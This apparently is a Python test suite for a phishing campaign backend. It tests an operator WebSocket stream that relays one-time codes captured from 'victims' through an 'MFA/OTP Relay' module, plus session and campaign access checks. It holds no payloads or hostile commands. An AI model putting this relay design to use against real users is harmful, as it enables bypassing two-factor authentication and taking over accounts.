import os
import unittest
from datetime import datetime, timezone
from unittest import mock

os.environ.setdefault("INTERNAL_API_KEY", "test-internal-key-" + ("x" * 32))

from fastapi import FastAPI, WebSocketDisconnect
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

import models  # noqa: F401 - register all ORM models before creating the schema
from core.operator_ws import OperatorWSManager
from database import Base, get_db
from models.campaign import Campaign
from models.module import Module
from models.user import User
from models.victim import Victim
from routes import campaign_victims as campaign_victims_module
from routes.auth import router as auth_router
from routes.campaign_victims import router as campaign_victims_router
from routes.operator_stream import router as operator_stream_router
from utils.auth import hash_password
from utils.internal_auth import derive_campaign_api_key
from utils.session_auth import SESSION_COOKIE_NAME


class FakeSocket:
    """Minimal WebSocket stand-in for manager-level tests."""

    def __init__(self, fail=False):
        self.sent = []
        self.fail = fail

    async def send_json(self, payload):
        if self.fail:
            raise RuntimeError("dead socket")
        self.sent.append(payload)


class OperatorWSManagerTests(unittest.IsolatedAsyncioTestCase):
    def setUp(self):
        self.manager = OperatorWSManager()

    async def test_broadcast_delivers_to_every_socket_of_the_campaign(self):
        first = FakeSocket()
        second = FakeSocket()
        other = FakeSocket()
        await self.manager.connect("campaign-1", first)
        await self.manager.connect("campaign-1", second)
        await self.manager.connect("campaign-2", other)

        delivered = await self.manager.broadcast("campaign-1", {"type": "module_data"})

        self.assertEqual(delivered, 2)
        self.assertEqual(first.sent, [{"type": "module_data"}])
        self.assertEqual(second.sent, [{"type": "module_data"}])
        self.assertEqual(other.sent, [])

    async def test_broadcast_prunes_dead_sockets(self):
        alive = FakeSocket()
        dead = FakeSocket(fail=True)
        await self.manager.connect("campaign-1", alive)
        await self.manager.connect("campaign-1", dead)

        delivered = await self.manager.broadcast("campaign-1", {"type": "module_data"})

        self.assertEqual(delivered, 1)
        self.assertEqual(self.manager.connection_count("campaign-1"), 1)

        # Subsequent broadcasts no longer touch the dead socket.
        delivered = await self.manager.broadcast("campaign-1", {"type": "module_data"})
        self.assertEqual(delivered, 1)
        self.assertEqual(len(alive.sent), 2)

    async def test_disconnect_removes_socket_and_prunes_empty_campaign(self):
        websocket = FakeSocket()
        await self.manager.connect("campaign-1", websocket)

        self.assertTrue(await self.manager.disconnect("campaign-1", websocket))
        self.assertEqual(self.manager.connection_count("campaign-1"), 0)
        self.assertNotIn("campaign-1", self.manager.campaigns)

        # A second disconnect (or unknown socket) is a no-op.
        self.assertFalse(await self.manager.disconnect("campaign-1", websocket))

    async def test_broadcast_to_unknown_campaign_delivers_nothing(self):
        self.assertEqual(await self.manager.broadcast("missing", {"type": "x"}), 0)


class OperatorStreamRouteTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.engine = create_engine(
            "sqlite://",
            connect_args={"check_same_thread": False},
            poolclass=StaticPool,
        )
        cls.Session = sessionmaker(
            bind=cls.engine,
            autocommit=False,
            autoflush=False,
        )

        app = FastAPI()
        app.include_router(auth_router, prefix="/api/auth")
        app.include_router(campaign_victims_router, prefix="/api/campaigns")
        app.include_router(operator_stream_router, prefix="/api/campaigns")

        def override_db():
            db = cls.Session()
            try:
                yield db
            finally:
                db.close()

        app.dependency_overrides[get_db] = override_db
        cls.client = TestClient(app, base_url="https://testserver")

    def setUp(self):
        self.client.cookies.clear()
        Base.metadata.drop_all(bind=self.engine)
        Base.metadata.create_all(bind=self.engine)
        with self.Session() as db:
            db.add(
                User(
                    id="admin-1",
                    username="admin",
                    email="admin@example.test",
                    password=hash_password("correct horse battery staple"),
                    role="admin",
                    is_active=True,
                )
            )
            db.add(
                Campaign(
                    id="campaign-1",
                    name="Test Campaign",
                    target_url="https://example.test",
                    created_by="admin-1",
                )
            )
            db.add(
                Victim(
                    id="victim-1",
                    campaign_id="campaign-1",
                    email="victim@example.test",
                    tracking_id="track-1",
                    session_id="session-1",
                    scheduled_send_at=datetime.now(timezone.utc),
                )
            )
            db.add(
                Module(
                    id="mod-mfa",
                    name="MFA/OTP Relay",
                    category="MFA Relay",
                    payload="<div></div>",
                    link="c/{{victim_id}}",
                )
            )
            db.commit()

    def login(self):
        response = self.client.post(
            "/api/auth/login",
            json={
                "username": "admin",
                "password": "correct horse battery staple",
            },
        )
        self.assertEqual(response.status_code, 200, response.text)

    def internal_headers(self):
        return {
            "X-Internal-API-Key": derive_campaign_api_key(
                os.environ["INTERNAL_API_KEY"],
                "campaign-1",
            )
        }

    def ws_connect(self, campaign_id="campaign-1"):
        """Open an authenticated operator stream.

        The session cookie is Secure, and the TestClient dials a ws:// URL,
        so httpx withholds it from the jar; pass it explicitly.
        """
        raw_session = self.client.cookies.get(SESSION_COOKIE_NAME)
        return self.client.websocket_connect(
            f"/api/campaigns/{campaign_id}/stream",
            headers={"Cookie": f"{SESSION_COOKIE_NAME}={raw_session}"},
        )

    def post_module_data(self, metadata=None):
        return self.client.post(
            "/api/campaigns/campaign-1/victims/victim-1/data",
            headers=self.internal_headers(),
            json={
                "data_type": "module_data",
                "module_id": "mod-mfa",
                "extra_metadata": metadata or {"code": "123456"},
            },
        )

    def test_stream_rejects_connection_without_session_cookie(self):
        with self.assertRaises(WebSocketDisconnect):
            with self.client.websocket_connect("/api/campaigns/campaign-1/stream"):
                pass

    def test_stream_rejects_session_without_campaign_access(self):
        with self.Session() as db:
            db.add(
                User(
                    id="operator-1",
                    username="operator",
                    email="operator@example.test",
                    password=hash_password("correct horse battery staple"),
                    role="operator",
                    is_active=True,
                )
            )
            db.commit()

        response = self.client.post(
            "/api/auth/login",
            json={
                "username": "operator",
                "password": "correct horse battery staple",
            },
        )
        self.assertEqual(response.status_code, 200, response.text)

        # The campaign belongs to admin-1, so a plain operator is denied
        # even with a valid session cookie.
        with self.assertRaises(WebSocketDisconnect):
            with self.ws_connect():
                pass

    def test_module_data_post_broadcasts_to_connected_operator(self):
        self.login()

        with self.ws_connect() as websocket:
            response = self.post_module_data(metadata={"code": "123456"})
            self.assertEqual(response.status_code, 200, response.text)

            event = websocket.receive_json()
            self.assertEqual(event["type"], "module_data")
            self.assertEqual(event["victim_id"], "victim-1")
            self.assertEqual(event["module_id"], "mod-mfa")
            self.assertEqual(event["module_name"], "MFA/OTP Relay")
            self.assertEqual(event["metadata"], {"code": "123456"})
            self.assertIsNotNone(event["collected_at"])

    def test_broadcast_failure_does_not_break_the_data_endpoint(self):
        with mock.patch.object(
            campaign_victims_module.operator_ws_manager,
            "broadcast",
            side_effect=RuntimeError("stream unavailable"),
        ):
            response = self.post_module_data(metadata={"code": "654321"})

        self.assertEqual(response.status_code, 200, response.text)
        self.assertTrue(response.json()["success"])

    def test_non_module_data_post_does_not_broadcast(self):
        self.login()

        with self.ws_connect() as websocket:
            response = self.client.post(
                "/api/campaigns/campaign-1/victims/victim-1/data",
                headers=self.internal_headers(),
                json={"data_type": "screenshot", "file_path": "screenshots/a.png"},
            )
            self.assertEqual(response.status_code, 200, response.text)

            # No broadcast expected; the next event on the socket is the one
            # triggered by a subsequent module_data post.
            self.post_module_data(metadata={"code": "111111"})
            event = websocket.receive_json()
            self.assertEqual(event["type"], "module_data")
            self.assertEqual(event["metadata"], {"code": "111111"})


if __name__ == "__main__":
    unittest.main()
